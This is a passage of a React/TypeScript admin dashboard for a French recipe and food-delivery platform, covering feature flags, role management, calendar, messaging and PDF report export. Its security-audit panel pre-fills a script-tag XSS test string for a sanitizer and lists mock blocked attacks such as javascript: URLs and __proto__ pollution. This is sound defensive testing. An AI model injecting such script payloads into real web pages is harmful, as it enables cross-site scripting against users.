import React, { useState, useMemo, useEffect } from 'react';
import { 
  X, 
  Search, 
  Bell, 
  Settings, 
  Plus, 
  ChevronDown, 
  ChevronRight, 
  Filter, 
  ArrowUpDown, 
  Share2, 
  Download, 
  Calendar as CalendarIcon, 
  Users, 
  MessageSquare, 
  BarChart3, 
  CheckCircle2, 
  AlertCircle, 
  Trash2, 
  Edit3, 
  Mail, 
  Phone, 
  ShieldCheck, 
  ChefHat, 
  Truck, 
  Store, 
  Utensils, 
  BookOpen, 
  GraduationCap, 
  Sparkles, 
  Clock, 
  Flame, 
  Eye, 
  FileText, 
  RefreshCw, 
  SlidersHorizontal, 
  Layers, 
  Lock, 
  LogOut, 
  Heart, 
  Bookmark, 
  Compass, 
  FileDown, 
  Send, 
  Paperclip, 
  MessageCircle, 
  Check, 
  HelpCircle,
  TrendingUp,
  DollarSign,
  Maximize2,
  Minimize2,
  CalendarDays,
  ShoppingBag,
  ExternalLink,
  Crown,
  Award,
  Globe2,
  UserCheck,
  Megaphone,
  Video
} from 'lucide-react';
import { 
  User, 
  UserRole, 
  Recipe, 
  PlatformFeatureFlags, 
  AdminCalendarEvent, 
  AdminConversation, 
  AdminInternalMessage 
} from '../types';
import { SupportedLanguage, TRANSLATIONS } from '../i18n/translations';
import { DeliveryOrder, RestaurantStore } from '../data/deliveryData';
import { 
  INITIAL_FEATURE_FLAGS, 
  INITIAL_CALENDAR_EVENTS, 
  INITIAL_ADMIN_CONVERSATIONS, 
  INITIAL_ADMIN_MESSAGES, 
  ADMIN_STATS_DATA, 
  downloadCsvStats, 
  downloadJsonStats 
} from '../data/adminData';
import { MediaCampaignAnalytics } from './MediaCampaignAnalytics';
import { 
  MEDIA_CAMPAIGN_ANALYTICS, 
  downloadMediaReportCsv, 
  downloadMediaReportJson 
} from '../data/mediaCampaignData';
import jsPDF from 'jspdf';
import { auditSecurityPayload, SecurityThreatReport } from '../utils/securitySanitizer';
import { fetchAllUsers, setUserRole } from '../services/adminService';
import { profileToUser } from '../services/profileService';
import { toUserMessage } from '../lib/supabase';

interface AdminDashboardModalProps {
  isOpen: boolean;
  onClose: () => void;
  currentUser: User;
  recipes: Recipe[];
  // Backend recipe management (all actions are re-checked by database RLS)
  recipesStatus?: 'loading' | 'ready' | 'error';
  onReloadRecipes?: () => void;
  onEditRecipe?: (recipe: Recipe) => void;
  onTogglePublishRecipe?: (recipe: Recipe) => Promise<void>;
  onDeleteRecipe?: (recipe: Recipe) => Promise<void>;
  onPreviewRecipe?: (recipeId: string) => void;
  deliveryOrders?: DeliveryOrder[];
  deliveryRestaurants?: RestaurantStore[];
  featureFlags?: PlatformFeatureFlags;
  onToggleFeatureFlag?: (featureId: keyof PlatformFeatureFlags, enabled: boolean) => void;
  onResetFeatureFlags?: () => void;
  onNavigateToTab?: (tabId: string) => void;
  onOpenCreateRecipe?: () => void;
  language?: SupportedLanguage;
}

type AdminTab = 
  | 'dashboard'
  | 'courses'
  | 'recently_viewed'
  | 'calendar'
  | 'saved_recipes'
  | 'grocery_list'
  | 'delivery'
  | 'recommended'
  | 'experiences'
  | 'stories'
  | 'media_campaigns'
  | 'users_roles'
  | 'messaging'
  | 'analytics'
  | 'feature_flags'
  | 'security_audit'
  | 'faqs';

export const AdminDashboardModal: React.FC<AdminDashboardModalProps> = ({
  isOpen,
  onClose,
  currentUser,
  recipes = [],
  recipesStatus = 'ready',
  onReloadRecipes,
  onEditRecipe,
  onTogglePublishRecipe,
  onDeleteRecipe,
  onPreviewRecipe,
  deliveryOrders = [],
  deliveryRestaurants = [],
  featureFlags: externalFeatureFlags,
  onToggleFeatureFlag,
  onResetFeatureFlags,
  onNavigateToTab,
  onOpenCreateRecipe,
  language = 'fr'
}) => {
  if (!isOpen) return null;

  const t = TRANSLATIONS[language] || TRANSLATIONS.fr;

  // Active navigation tab
  const [activeTab, setActiveTab] = useState<AdminTab>('dashboard');
  const [searchQuery, setSearchQuery] = useState('');
  const [selectedCategoryPill, setSelectedCategoryPill] = useState<string>('all');
  const [timeRange, setTimeRange] = useState<'7d' | '30d' | '12m'>('30d');
  const [isFullscreen, setIsFullscreen] = useState(false);

  // Feature Flags State
  const [internalFeatureFlags, setInternalFeatureFlags] = useState<PlatformFeatureFlags>(INITIAL_FEATURE_FLAGS);
  const activeFeatureFlags = externalFeatureFlags || internalFeatureFlags;

  const handleToggleFlag = (key: keyof PlatformFeatureFlags, val: boolean) => {
    if (onToggleFeatureFlag) {
      onToggleFeatureFlag(key, val);
    } else {
      setInternalFeatureFlags(prev => ({ ...prev, [key]: val }));
    }
    setToastNotice(`Fonctionnalité "${key}" ${val ? 'activée' : 'désactivée'} en direct.`);
    setTimeout(() => setToastNotice(null), 3500);
  };

  const handleEnableAllFlags = () => {
    const allEnabled = Object.keys(activeFeatureFlags).reduce((acc, k) => {
      acc[k as keyof PlatformFeatureFlags] = true;
      return acc;
    }, {} as PlatformFeatureFlags);
    if (onResetFeatureFlags) {
      onResetFeatureFlags();
    } else {
      setInternalFeatureFlags(allEnabled);
    }
    setToastNotice('Toutes les fonctionnalités de la plateforme ont été activées.');
    setTimeout(() => setToastNotice(null), 3500);
  };

  // Users & Roles State
  // Registered users, loaded from Supabase (admin-only via RLS)
  const [usersList, setUsersList] = useState<User[]>([]);
  const [usersStatus, setUsersStatus] = useState<'loading' | 'ready' | 'error'>('loading');
  const [usersError, setUsersError] = useState<string | null>(null);
  const [roleUpdatingUserId, setRoleUpdatingUserId] = useState<string | null>(null);
  const [recipeActionId, setRecipeActionId] = useState<string | null>(null);
  const [recipeStatusFilter, setRecipeStatusFilter] = useState<'all' | 'published' | 'draft'>('all');

  const loadUsers = async () => {
    setUsersStatus('loading');
    setUsersError(null);
    try {
      const rows = await fetchAllUsers();
      setUsersList(rows.map(row => ({ ...profileToUser(row, row.role), isCurrentUser: row.id === currentUser.id })));
      setUsersStatus('ready');
    } catch (error) {
      setUsersError(toUserMessage(error, 'Impossible de charger les utilisateurs.'));
      setUsersStatus('error');
    }
  };

  useEffect(() => {
    loadUsers();
  }, []);
  const [selectedRoleFilter, setSelectedRoleFilter] = useState<string>('all');
  const [userRoleEditSuccess, setUserRoleEditSuccess] = useState<string | null>(null);

  // Security & Pentest Audit State
  const [pentestInput, setPentestInput] = useState('<script>alert("Tentative XSS test")</script>');
  const [activeThreatReport, setActiveThreatReport] = useState<SecurityThreatReport | null>(null);
  const [securityEventsLog, setSecurityEventsLog] = useState<Array<{ id: string; time: string; threat: string; action: string; status: 'blocked' | 'neutralized' | 'passed' }>>([
    { id: 'sec-1', time: '18:42:10', threat: 'Script Tag Injection <script>', action: 'Échappement automatique entités HTML', status: 'neutralized' },
    { id: 'sec-2', time: '18:35:04', threat: 'Faux protocole javascript:', action: 'Remplacement strict par safe URL #', status: 'blocked' },
    { id: 'sec-3', time: '18:22:15', threat: 'Reverse Tabnabbing sur lien externe', action: 'Injection forcée de rel="noopener noreferrer"', status: 'blocked' },
    { id: 'sec-4', time: '18:10:48', threat: 'Spam 40 requêtes / seconde', action: 'Token Bucket Rate Limiter activé', status: 'blocked' },
    { id: 'sec-5', time: '17:58:30', threat: 'Désérialisation prototype __proto__', action: 'Clé malveillante isolée et neutralisée', status: 'neutralized' },
  ]);

  const runPentestCheck = (payload: string) => {
    const report = auditSecurityPayload(payload);
    setActiveThreatReport(report);
    if (report.isThreat) {
      setSecurityEventsLog(prev => [
        {
          id: `sec-${Date.now()}`,
          time: new Date().toLocaleTimeString('fr-FR'),
          threat: `${report.threatType}: ${payload.slice(0, 32)}...`,
          action: report.description || 'Payload neutralisé',
          status: 'neutralized'
        },
        ...prev.slice(0, 9)
      ]);
    }
  };

  // Calendar State
  const [calendarEvents, setCalendarEvents] = useState<AdminCalendarEvent[]>(INITIAL_CALENDAR_EVENTS);
  const [selectedCalendarDate, setSelectedCalendarDate] = useState<string>('2026-10-10');
  const [isAddEventModalOpen, setIsAddEventModalOpen] = useState(false);
  const [newEventTitle, setNewEventTitle] = useState('');
  const [newEventDate, setNewEventDate] = useState('2026-10-25');
  const [newEventTime, setNewEventTime] = useState('18:00');
  const [newEventType, setNewEventType] = useState<'masterclass' | 'tasting' | 'experience' | 'delivery_batch' | 'workshop'>('masterclass');
  const [newEventHost, setNewEventHost] = useState('Chef Fatou Ndiaye');
  const [newEventLocation, setNewEventLocation] = useState('Studio Culinaire Paris');

  // Messaging State
  const [conversations] = useState<AdminConversation[]>(INITIAL_ADMIN_CONVERSATIONS);
  const [activeConvId, setActiveConvId] = useState<string>(INITIAL_ADMIN_CONVERSATIONS[0].id);
  const [messagesData, setMessagesData] = useState<Record<string, AdminInternalMessage[]>>(INITIAL_ADMIN_MESSAGES);
  const [messageInput, setMessageInput] = useState('');
  const [activeConvCategory, setActiveConvCategory] = useState<'all' | 'support' | 'chefs' | 'drivers' | 'staff'>('all');

  // Notification Toast
  const [toastNotice, setToastNotice] = useState<string | null>(null);

  // Helper for PDF Stats Export
  const handleExportPdfReport = () => {
    const doc = new jsPDF({ orientation: 'portrait', unit: 'mm', format: 'a4' });
    const pw = doc.internal.pageSize.getWidth();

    // Header banner
    doc.setFillColor(15, 62, 46); // #0F3E2E
    doc.rect(0, 0, pw, 26, 'F');
    doc.setFillColor(255, 78, 39); // #FF4E27
    doc.rect(0, 26, pw, 2.5, 'F');

    doc.setTextColor(255, 255, 255);
    doc.setFont('helvetica', 'bold');
    doc.setFontSize(16);
    doc.text('AFRODELICIOUS · RAPPORT STATISTIQUE OFFICIEL', 14, 15);

    doc.setFont('helvetica', 'normal');
    doc.setFontSize(8.5);
    doc.setTextColor(245, 158, 11);
    doc.text(`Direction Générale · Extraction du ${new Date().toLocaleDateString('fr-FR')} à ${new Date().toLocaleTimeString('fr-FR')}`, 14, 21);

    // KPI Summary
    let y = 38;
    doc.setTextColor(15, 62, 46);
    doc.setFont('helvetica', 'bold');
    doc.setFontSize(11);
    doc.text('1. INDICATEURS CLÉS DE PERFORMANCE (KPIs)', 14, y);
    y += 8;

    const kpiItems = [
      ['Chiffre d\'Affaires Global', `${ADMIN_STATS_DATA.totalRevenue.toFixed(2)} €`],
      ['Commissions de Livraison Prélevées', `${ADMIN_STATS_DATA.commissionsEarned.toFixed(2)} €`],
      ['Nombre de Commandes de Repas', `${ADMIN_STATS_DATA.deliveryOrdersCount} commandes`],
      ['Panier Moyen Client', `${ADMIN_STATS_DATA.averageOrderValue.toFixed(2)} €`],
      ['Utilisateurs Actifs Enregistrés', `${ADMIN_STATS_DATA.activeUsers} membres`],
      ['Chefs Partenaires Certifiés', `${ADMIN_STATS_DATA.registeredChefs} toques`],
      ['Recettes Traditionnelles Publiées', `${ADMIN_STATS_DATA.recipesCount} recettes`],
      ['Pourboires Versés aux Coursiers', `${ADMIN_STATS_DATA.driverTipsTotal.toFixed(2)} € (100% reversé)`]
    ];

    doc.setFillColor(248, 250, 252);
    doc.roundedRect(14, y, pw - 28, 48, 2, 2, 'F');
    doc.setDrawColor(226, 232, 240);
    doc.roundedRect(14, y, pw - 28, 48, 2, 2, 'S');

    doc.setFont('helvetica', 'normal');
    doc.setFontSize(8.5);
    doc.setTextColor(51, 65, 85);

    kpiItems.forEach((item, idx) => {
      const col = idx % 2 === 0 ? 18 : pw / 2 + 6;
      const row = y + 7 + Math.floor(idx / 2) * 10;
      doc.setFont('helvetica', 'bold');
      doc.text(`${item[0]} :`, col, row);
      doc.setFont('helvetica', 'normal');
      doc.text(item[1], col + 60, row);
    });

    y += 56;

    // Terroir Breakdown
    doc.setTextColor(15, 62, 46);
    doc.setFont('helvetica', 'bold');
    doc.setFontSize(11);
    doc.text('2. RÉPARTITION DES VENTES PAR TERROIR CULINAIRE', 14, y);
    y += 8;

    ADMIN_STATS_DATA.salesByTerroir.forEach(t => {
      doc.setFont('helvetica', 'normal');
      doc.setFontSize(8.5);
      doc.setTextColor(30, 41, 59);
      doc.text(`• ${t.terroir}`, 16, y);
      doc.setFont('helvetica', 'bold');
      doc.text(`${t.percentage}%  (${t.revenue.toFixed(2)} €)`, pw - 20, y, { align: 'right' });
      y += 6.5;
    });

    y += 6;
    doc.setTextColor(15, 62, 46);
    doc.setFont('helvetica', 'bold');
    doc.setFontSize(11);
    doc.text('3. CONFORMITÉ & CONTRÔLE DES FONCTIONNALITÉS', 14, y);
    y += 7;

    const enabledCount = Object.values(activeFeatureFlags).filter(Boolean).length;
    doc.setFont('helvetica', 'normal');
    doc.setFontSize(8);
    doc.setTextColor(71, 85, 105);
    doc.text(`État du système : ${enabledCount} / ${Object.keys(activeFeatureFlags).length} modules actifs en direct. Audit certifié par Afrodelicious SAS.`, 16, y);

    // Footer Page 1
    doc.setFont('helvetica', 'italic');
    doc.setFontSize(7);
    doc.setTextColor(148, 163, 184);
    doc.text('Afrodelicious Administration · Page 1/2 · Document sécurisé et confidentiel', pw / 2, 285, { align: 'center' });

    // ==========================================
    // PAGE 2: MEDIA KIT & CAMPAGNES PUBLICITAIRES
    // ==========================================
    doc.addPage();
    doc.setFillColor(15, 62, 46);
    doc.rect(0, 0, pw, 26, 'F');
    doc.setFillColor(255, 78, 39);
    doc.rect(0, 26, pw, 2.5, 'F');

    doc.setTextColor(255, 255, 255);
    doc.setFont('helvetica', 'bold');
    doc.setFontSize(16);
    doc.text('AFRODELICIOUS · MEDIA KIT & ANALYSES PUBLICITAIRES', 14, 15);

    doc.setFont('helvetica', 'normal');
    doc.setFontSize(8.5);
    doc.setTextColor(245, 158, 11);
    doc.text('Performances Médias sur 90 jours (Audience, Formats, Vidéos & CPM)', 14, 21);

    let y2 = 38;
    doc.setTextColor(15, 62, 46);
    doc.setFont('helvetica', 'bold');
    doc.setFontSize(11);
    doc.text('4. AUDIENCE QUALIFIÉE & COMPORTEMENTS D\'ACHAT', 14, y2);
    y2 += 8;

    const mediaAudience = [
      ['Utilisateurs Actifs Mensuels', `${MEDIA_CAMPAIGN_ANALYTICS.audience.totalActiveUsersMonthly.toLocaleString('fr-FR')} MAU`],
      ['Part Audience USA', `${MEDIA_CAMPAIGN_ANALYTICS.audience.usAudience.percentage}% (${MEDIA_CAMPAIGN_ANALYTICS.audience.usAudience.totalUsers.toLocaleString('fr-FR')} membres)`],
      ['Clics Sortants Retailers', `${MEDIA_CAMPAIGN_ANALYTICS.purchaseIntent.totalProductAndBrandClicks.toLocaleString('fr-FR')} clics`],
      ['Taux Redirection Marchands', `${MEDIA_CAMPAIGN_ANALYTICS.purchaseIntent.retailerOutboundClickRatePercent}% (Amazon, Walmart, Instacart)`],
      ['Ajouts Panier Partenaire', `${MEDIA_CAMPAIGN_ANALYTICS.purchaseIntent.partnerCartAdditionsCount.toLocaleString('fr-FR')} ajouts direct`],
      ['Search Lift Marque Post-Ad', `+${MEDIA_CAMPAIGN_ANALYTICS.purchaseIntent.brandSearchLiftPercent}% de requêtes in-app`],
      ['Taux Conversion & ROAS', `${MEDIA_CAMPAIGN_ANALYTICS.purchaseIntent.conversionRatePercent}% conv. | ROAS ${MEDIA_CAMPAIGN_ANALYTICS.purchaseIntent.roasMultiplier}x`],
      ['CPA Moyen Mesuré', `${MEDIA_CAMPAIGN_ANALYTICS.purchaseIntent.cpaEur} € ($${MEDIA_CAMPAIGN_ANALYTICS.purchaseIntent.cpaUsd})`]
    ];

    doc.setFillColor(248, 250, 252);
    doc.roundedRect(14, y2, pw - 28, 48, 2, 2, 'F');
    doc.setDrawColor(226, 232, 240);
    doc.roundedRect(14, y2, pw - 28, 48, 2, 2, 'S');

    doc.setFont('helvetica', 'normal');
    doc.setFontSize(8.5);
    doc.setTextColor(51, 65, 85);

    mediaAudience.forEach((item, idx) => {
      const col = idx % 2 === 0 ? 18 : pw / 2 + 6;
      const row = y2 + 7 + Math.floor(idx / 2) * 10;
      doc.setFont('helvetica', 'bold');
      doc.text(`${item[0]} :`, col, row);
      doc.setFont('helvetica', 'normal');
      doc.text(item[1], col + 58, row);
    });

    y2 += 56;

    doc.setTextColor(15, 62, 46);
    doc.setFont('helvetica', 'bold');
    doc.setFontSize(11);
    doc.text('5. KPIS PAR FORMAT PUBLICITAIRE (MOYENNE 90 JOURS)', 14, y2);
    y2 += 8;

    MEDIA_CAMPAIGN_ANALYTICS.formatsKPIs.forEach(f => {
      doc.setFont('helvetica', 'bold');
      doc.setFontSize(8.5);
      doc.setTextColor(30, 41, 59);
      doc.text(`• ${f.formatName} (CPM ${f.cpmEur} €)`, 16, y2);
      doc.setFont('helvetica', 'normal');
      doc.text(`CTR: ${f.ctrPercent}% | Inter: ${f.interactionRatePercent}% | Sauvegarde: ${f.recipeSaveRatePercent}% | Retour: ${f.brandReturnRatePercent}%`, pw - 18, y2, { align: 'right' });
      y2 += 6.5;
    });

    y2 += 6;
    doc.setTextColor(15, 62, 46);
    doc.setFont('helvetica', 'bold');
    doc.setFontSize(11);
    doc.text('6. INDICATEURS VIDÉO INDISPENSABLES', 14, y2);
    y2 += 8;

    const vidKpis = [
      `Taux de complétion vidéo (VCR): ${MEDIA_CAMPAIGN_ANALYTICS.videoKPIs.vcrCompletionRatePercent}%`,
      `Quartiles: 25% (${MEDIA_CAMPAIGN_ANALYTICS.videoKPIs.completionQuartiles.q25}%) · 50% (${MEDIA_CAMPAIGN_ANALYTICS.videoKPIs.completionQuartiles.q50}%) · 75% (${MEDIA_CAMPAIGN_ANALYTICS.videoKPIs.completionQuartiles.q75}%) · 100% (${MEDIA_CAMPAIGN_ANALYTICS.videoKPIs.completionQuartiles.q100}%)`,
      `Durée moyenne de visionnage: ${MEDIA_CAMPAIGN_ANALYTICS.videoKPIs.avgWatchDurationSeconds}s / 30s | Hook Rate (3s): ${MEDIA_CAMPAIGN_ANALYTICS.videoKPIs.threeSecondsViewRatePercent}% | Clic post-vidéo: ${MEDIA_CAMPAIGN_ANALYTICS.videoKPIs.postVideoClickRatePercent}% | Replay: ${MEDIA_CAMPAIGN_ANALYTICS.videoKPIs.replayRatePercent}%`
    ];

    vidKpis.forEach(text => {
      doc.setFont('helvetica', 'normal');
      doc.setFontSize(8);
      doc.setTextColor(71, 85, 105);
      doc.text(text, 16, y2);
      y2 += 5.5;
    });

    doc.setFont('helvetica', 'italic');
    doc.setFontSize(7);
    doc.setTextColor(148, 163, 184);
    doc.text('Afrodelicious Media Kit 2026 · Page 2/2 · Régie Publicitaire Intégrée · contact@afrodelicious.app', pw / 2, 285, { align: 'center' });

    doc.save(`Rapport_Stats_Afrodelicious_${new Date().toISOString().slice(0, 10)}.pdf`);
    setToastNotice('Rapport PDF complet (2 pages avec Media Kit) téléchargé avec succès !');
    setTimeout(() => setToastNotice(null), 3500);
  };

  // Handle Send Internal Message
  const handleSendMessage = (e: React.FormEvent) => {
    e.preventDefault();
    if (!messageInput.trim()) return;

    const newMsg: AdminInternalMessage = {
      id: `msg-${Date.now()}`,
      conversationId: activeConvId,
      senderId: currentUser.id,
      senderName: `${currentUser.name} (Admin)`,
      senderRole: 'super_admin',
      senderAvatar: currentUser.avatar,
      content: messageInput.trim(),
      timestamp: new Date().toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit' }),
      isRead: true
    };

    setMessagesData(prev => ({
      ...prev,
      [activeConvId]: [...(prev[activeConvId] || []), newMsg]
    }));
    setMessageInput('');
  };

  // Handle Add Calendar Event
  const handleAddEvent = (e: React.FormEvent) => {
    e.preventDefault();
    if (!newEventTitle.trim()) return;

    const newEv: AdminCalendarEvent = {
      id: `cal-${Date.now()}`,
      title: newEventTitle.trim(),
      type: newEventType,
      date: newEventDate,
      time: newEventTime,
      hostName: newEventHost,
      hostAvatar: currentUser.avatar,
      location: newEventLocation,
      attendeesCount: 0,
      maxCapacity: 30,
      status: 'scheduled'
    };

    setCalendarEvents(prev => [newEv, ...prev]);
    setIsAddEventModalOpen(false);
    setNewEventTitle('');
    setToastNotice(`Événement "${newEv.title}" planifié dans le calendrier !`);
    setTimeout(() => setToastNotice(null), 3500);
  };

  // Handle Change User Role
  // Role changes go through the admin-only `set_user_role` database function
  const handleChangeUserRole = async (userId: string, newRole: UserRole) => {
    const target = usersList.find(u => u.id === userId);
    if (!target || target.role === newRole) return;
    if (newRole === 'admin' && !window.confirm(`Accorder les droits administrateur à ${target.name} ?`)) return;

    setRoleUpdatingUserId(userId);
    try {
      await setUserRole(userId, newRole === 'admin' ? 'admin' : 'user');
      setUsersList(prev => prev.map(u => u.id === userId ? { ...u, role: newRole, isVerified: newRole === 'admin' } : u));
      setUserRoleEditSuccess(`Rôle de ${target.name} mis à jour : ${newRole === 'admin' ? 'Administrateur' : 'Membre'}`);
    } catch (error) {
      setUserRoleEditSuccess(null);
      setToastNotice(toUserMessage(error, 'Le rôle n’a pas pu être modifié.'));
      setTimeout(() => setToastNotice(null), 4000);
    } finally {
      setRoleUpdatingUserId(null);
    }
    setTimeout(() => setUserRoleEditSuccess(null), 3000);
  };

  const runRecipeAction = async (recipe: Recipe, action: () => Promise<void>, failure: string) => {
    setRecipeActionId(recipe.id);
    try {
      await action();
    } catch (error) {
      setToastNotice(toUserMessage(error, failure));
      setTimeout(() => setToastNotice(null), 4000);
    } finally {
      setRecipeActionId(null);
    }
  };

  const handleTogglePublish = (recipe: Recipe) => {
    if (!onTogglePublishRecipe) return;
    runRecipeAction(recipe, () => onTogglePublishRecipe(recipe), 'Le statut de publication n’a pas pu être modifié.');
  };

  const handleDelete = (recipe: Recipe) => {
    if (!onDeleteRecipe) return;
    if (!window.confirm(`Supprimer définitivement la recette "${recipe.title}" ? Cette action est irréversible.`)) return;
    runRecipeAction(recipe, () => onDeleteRecipe(recipe), 'La recette n’a pas pu être supprimée.');
  };

  // Filtered recipes (search + publication status)
  const displayRecipes = useMemo(() => {
    return recipes.filter(r => {
      if (recipeStatusFilter === 'published' && !r.isPublished) return false;
      if (recipeStatusFilter === 'draft' && r.isPublished) return false;
      if (searchQuery.trim()) {
        const q = searchQuery.toLowerCase();
        return r.title.toLowerCase().includes(q) || r.authorName.toLowerCase().includes(q);
      }
      return true;
    });
  }, [recipes, searchQuery, recipeStatusFilter]);

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-2 sm:p-4 bg-black/80 backdrop-blur-md overflow-hidden">
      
      {/* Outer macOS-style Window Container matching the reference mockup */}
      <div className={`relative w-full ${isFullscreen ? 'h-full max-w-none' : 'max-w-[1360px] h-[92vh]'} bg-[#FAF9F6] rounded-3xl shadow-2xl border border-slate-300/80 flex flex-col overflow-hidden transition-all duration-300 font-sans`}>
        
        {/* ============================================================ */}
        {/* TOP WINDOW CHROME (Simulating Browser URL & Control Dots)    */}
        {/* ============================================================ */}
        <div className="px-4 py-2.5 bg-slate-100 border-b border-slate-200/90 flex items-center justify-between text-xs text-slate-600 select-none shrink-0">
          
          {/* macOS 3 Window Dots */}
          <div className="flex items-center gap-2">
            <button
              onClick={onClose}
              title="Fermer le Dashboard"
              className="w-3 h-3 rounded-full bg-rose-500 hover:bg-rose-600 transition-colors shadow-2xs"
            />
            <button
              onClick={() => setIsFullscreen(!isFullscreen)}
              title="Agrandir / Réduire"
              className="w-3 h-3 rounded-full bg-amber-400 hover:bg-amber-500 transition-colors shadow-2xs"
            />
            <button
              onClick={() => setIsFullscreen(!isFullscreen)}
              title="Plein écran"
              className="w-3 h-3 rounded-full bg-emerald-500 hover:bg-emerald-600 transition-colors shadow-2xs"
            />
            <div className="h-4 w-px bg-slate-300 ml-2" />
            <span className="font-bold text-[11px] text-slate-500 ml-1 hidden sm:inline">
              Afrodelicious Admin Workstation
            </span>
          </div>

          {/* Simulated URL Bar matching reference image */}
          <div className="flex-1 max-w-md mx-4 hidden md:flex items-center justify-center bg-white px-3 py-1 rounded-xl border border-slate-200 shadow-2xs text-[11px] font-mono text-slate-500 gap-2">
            <Lock className="w-3 h-3 text-emerald-600 shrink-0" />
            <span className="truncate">https://afrodelicious.app/admin/{activeTab}</span>
            <RefreshCw className="w-2.5 h-2.5 text-slate-400 ml-auto hover:text-slate-700 cursor-pointer" />
          </div>

          {/* Right Window Icons */}
          <div className="flex items-center gap-2">
            <button
              onClick={() => setIsFullscreen(!isFullscreen)}
              className="p-1 rounded-lg hover:bg-slate-200 text-slate-500"
              title={isFullscreen ? 'Fenêtre normale' : 'Plein écran'}
            >
              {isFullscreen ? <Minimize2 className="w-3.5 h-3.5" /> : <Maximize2 className="w-3.5 h-3.5" />}
            </button>
            <button
              onClick={onClose}
              className="p-1 rounded-lg hover:bg-slate-200 text-slate-500"
              title="Fermer"
            >
              <X className="w-4 h-4" />
            </button>
          </div>
        </div>

        {/* Global Toast Alert */}
        {toastNotice && (
          <div className="absolute top-12 left-1/2 -translate-x-1/2 z-50 px-5 py-2 rounded-2xl bg-slate-900 text-white text-xs font-bold shadow-2xl border border-slate-700 flex items-center gap-2 animate-in fade-in slide-in-from-top-2">
            <Sparkles className="w-3.5 h-3.5 text-amber-400" />
            <span>{toastNotice}</span>
          </div>
        )}

        {/* ============================================================ */}
        {/* MAIN DASHBOARD INTERFACE (Sidebar + Header + Body)          */}
        {/* ============================================================ */}
        <div className="flex-1 flex overflow-hidden">
          
          {/* ============================================================ */}
          {/* LEFT SIDEBAR (Matching reference image "Naluri Masak")       */}
          {/* ============================================================ */}
          <aside className="w-64 sm:w-72 bg-white border-r border-slate-200 flex flex-col justify-between shrink-0 overflow-y-auto">
            
            <div className="p-5 space-y-5">
              
              {/* Brand Logo & Toggle */}
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2.5">
                  <div className="w-9 h-9 rounded-2xl bg-gradient-to-tr from-[#FF4E27] to-[#F59E0B] text-white flex items-center justify-center font-black shadow-md shadow-[#FF4E27]/25">
                    <ShieldCheck className="w-5 h-5" />
                  </div>
                  <div>
                    <span className="font-serif font-black text-base text-slate-900 tracking-tight block leading-tight">
                      Afro<span className="text-[#FF4E27]">delicious</span>
                    </span>
                    <span className="text-[10px] font-bold uppercase tracking-wider text-emerald-700 bg-emerald-50 px-1.5 py-0.2 rounded">
                      Admin Portal
                    </span>
                  </div>
                </div>
                <div className="p-1 rounded-lg hover:bg-slate-100 text-slate-400 cursor-pointer">
                  <SlidersHorizontal className="w-4 h-4" />
                </div>
              </div>

              {/* Large Orange Action CTA Button (Matching `+ Add a Recipe` in mockup) */}
              <button
                type="button"
                onClick={() => {
                  if (activeTab === 'calendar') {
                    setIsAddEventModalOpen(true);
                  } else if (onOpenCreateRecipe) {
                    onOpenCreateRecipe();
                  } else {
                    setActiveTab('feature_flags');
                  }
                }}
                className="w-full py-3 px-4 rounded-2xl bg-[#FF4E27] hover:bg-[#E03814] text-white text-xs font-black shadow-lg shadow-[#FF4E27]/30 flex items-center justify-center gap-2 transition-all active:scale-[0.98] group cursor-pointer"
              >
                <Plus className="w-4 h-4 group-hover:rotate-90 transition-transform" />
                <span>
                  {activeTab === 'calendar' ? '+ Ajouter un Événement' : '+ Ajouter une Recette'}
                </span>
              </button>

              {/* Navigation Menu Section */}
              <div className="space-y-1">
                <span className="text-[11px] font-bold uppercase tracking-wider text-slate-400 px-3 pb-1 block">
                  Menu
                </span>

                {[
                  { id: 'dashboard', label: 'Dashboard', icon: BarChart3, badge: 'Live' },
                  { id: 'courses', label: 'Cooking Courses', icon: GraduationCap, flag: activeFeatureFlags.masterclasses },
                  { id: 'recently_viewed', label: 'Recently Viewed', icon: Clock },
                  { id: 'calendar', label: 'Weekly Prep & Calendrier', icon: CalendarDays, badge: `${calendarEvents.length}` },
                  { id: 'saved_recipes', label: 'Saved Recipes', icon: Bookmark, badge: `${recipes.length}` },
                  { id: 'grocery_list', label: 'Grocery List', icon: ShoppingBag, flag: activeFeatureFlags.grocery },
                  { id: 'delivery', label: 'Afrodelicious Delivery', icon: Truck, flag: activeFeatureFlags.delivery },
                  { id: 'recommended', label: 'Restaurants Recommandés', icon: Award, flag: activeFeatureFlags.recommended },
                  { id: 'experiences', label: 'Expériences Culinaires', icon: Utensils, flag: activeFeatureFlags.experiences },
                  { id: 'stories', label: 'Stories Vidéo', icon: Flame, flag: activeFeatureFlags.stories },
                  { id: 'media_campaigns', label: 'Analyses Médias & Pub', icon: Megaphone, badge: '90j' },
                ].map((item) => {
                  const Icon = item.icon;
                  const isActive = activeTab === item.id;
                  return (
                    <button
                      key={item.id}
                      type="button"
                      onClick={() => setActiveTab(item.id as AdminTab)}
                      className={`w-full flex items-center justify-between px-3.5 py-2.5 rounded-2xl text-xs font-bold transition-all text-left group ${
                        isActive
                          ? 'bg-orange-50 text-[#FF4E27] shadow-2xs font-black'
                          : 'text-slate-600 hover:text-slate-900 hover:bg-slate-50'
                      }`}
                    >
                      <div className="flex items-center gap-3">
                        <Icon className={`w-4 h-4 ${isActive ? 'text-[#FF4E27]' : 'text-slate-400 group-hover:text-slate-600'}`} />
                        <span>{item.label}</span>
                      </div>
                      {item.badge && (
                        <span className={`px-2 py-0.5 rounded-full text-[10px] font-black ${
                          isActive ? 'bg-[#FF4E27] text-white' : 'bg-slate-100 text-slate-600'
                        }`}>
                          {item.badge}
                        </span>
                      )}
                      {item.flag === false && (
                        <span className="w-2 h-2 rounded-full bg-slate-300" title="Module désactivé" />
                      )}
                    </button>
                  );
                })}
              </div>

              {/* Settings & Admin Advanced Section */}
              <div className="space-y-1 pt-2 border-t border-slate-100">
                <span className="text-[11px] font-bold uppercase tracking-wider text-slate-400 px-3 pb-1 block">
                  Settings & Administration
                </span>

                {[
                  { id: 'users_roles', label: 'Users Role', icon: Users, badge: `${usersList.length}` },
                  { id: 'messaging', label: 'Messagerie Interne', icon: MessageSquare, badge: '3' },
                  { id: 'analytics', label: 'Statistiques & Extractions', icon: TrendingUp },
                  { id: 'feature_flags', label: 'Contrôle Fonctionnalités', icon: SlidersHorizontal, badge: 'Direct' },
